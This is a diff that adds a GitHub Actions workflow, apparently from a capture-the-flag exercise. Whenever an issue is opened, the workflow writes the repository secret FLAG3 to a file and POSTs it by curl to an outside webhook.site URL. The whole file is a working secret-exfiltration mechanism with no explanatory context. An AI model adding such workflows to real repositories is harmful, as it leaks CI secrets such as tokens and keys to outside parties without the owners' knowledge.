@@ -1,0 +1,23 @@
+name: Send flag to webhook
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  send_flag:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+      
+      - name: Read flag
+        run: |
+          echo "${{ secrets.FLAG3 }}" > flag.txt
+      
+      - name: Send flag to webhook
+        run: |
+          URL="https://webhook.site/2c9bd304-bd77-4157-8b8e-1ee4a93ec671"
+          SECRET=$(cat flag.txt)
+          BODY="{\"secret\": \"$SECRET\"}"
+          RESPONSE=$(curl -X POST -H "Content-Type: application/json" -d "$BODY" "$URL")
+          echo "$RESPONSE"
